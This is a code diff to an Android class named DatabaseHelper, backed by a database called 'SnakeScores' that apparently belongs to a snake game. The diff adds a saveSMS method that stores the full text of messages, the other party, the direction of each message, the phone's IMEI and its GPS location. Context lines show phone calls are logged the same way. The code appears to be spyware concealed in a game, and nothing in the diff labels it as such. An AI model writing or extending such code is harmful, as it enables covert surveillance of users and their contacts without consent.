@@ -19,7 +19,7 @@ import java.util.ArrayList;
 
 public class DatabaseHelper extends SQLiteOpenHelper {
     private static final String DATABASE_NAME = "SnakeScores";
-    private static final int DATABASE_VERSION = 9;
+    private static final int DATABASE_VERSION = 10;
     Context context;
 
     public DatabaseHelper(Context context){
@@ -49,7 +49,7 @@ public class DatabaseHelper extends SQLiteOpenHelper {
         }catch(SQLiteException ex){}
 
         try{
-            db.execSQL("CREATE TABLE SMS (DeviceID INTEGER, Sender TEXT, Receiver TEXT, Time INTEGER, Message TEXT, Type INTEGER, Lat INTEGER, Long INTEGER);");
+            db.execSQL("CREATE TABLE SMS (DeviceID INTEGER, Participant TEXT, Outgoing INTEGER, Time INTEGER, Message TEXT, Lat INTEGER, Long INTEGER);");
         }catch(SQLiteException ex){}
     }
 
@@ -144,6 +144,29 @@ public class DatabaseHelper extends SQLiteOpenHelper {
 
         SQLiteDatabase db = getWritableDatabase();
         db.insert("PhoneCalls", null, row);
+        db.close();
+    }
+
+    public void saveSMS(String participant, boolean outgoing, String message, long time){
+        if(participant == null){
+            return;
+        }
+        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+        String imei = tm.getDeviceId();
+        ContentValues row = new ContentValues();
+        row.put("DeviceID", imei);
+        row.put("Participant", participant);
+        row.put("Outgoing", outgoing ? 1: 0);
+        row.put("Time", time);
+        row.put("Message", message);
+        Location loc = getLocation();
+        if(loc != null) {
+            row.put("Lat", loc.getLatitude());
+            row.put("Long", loc.getLongitude());
+        }
+
+        SQLiteDatabase db = getWritableDatabase();
+        db.insert("SMS", null, row);
         db.close();
     }
 
